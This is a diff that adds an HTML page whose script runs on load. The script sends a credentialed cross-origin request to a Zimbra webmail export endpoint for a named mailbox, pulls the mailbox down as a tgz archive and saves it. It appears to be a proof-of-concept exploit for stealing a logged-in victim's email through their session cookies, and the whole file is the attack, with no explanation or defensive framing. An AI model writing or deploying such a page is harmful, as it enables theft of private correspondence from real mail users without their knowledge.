@@ -1,0 +1,32 @@
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+
+        var xhr = new XMLHttpRequest();
+
+         xhr.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+                var downloadUrl = URL.createObjectURL(xhr.response);
+                var a = document.createElement("a");
+                document.body.appendChild(a);
+                a.style = "display: none";
+                a.href = downloadUrl;
+                a.download = "";
+                a.click();
+            }
+          };
+
+        xhr.open("GET", "https://vmail.vnexit.com/api/zimbra/home-service/hunglm25%40viettel.com.vn/?fmt=tgz&filename=aaa&emptyname=&charset=UTF-8&callback=ZmImportExportController.exportErrorCallback__export5", true);
+        xhr.setRequestHeader("Accept", "*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.responseType = 'blob';
+        xhr.withCredentials = true;
+        xhr.send();
+			}
+
+      submitRequest();
+    </script>
+  </body>
+</html>
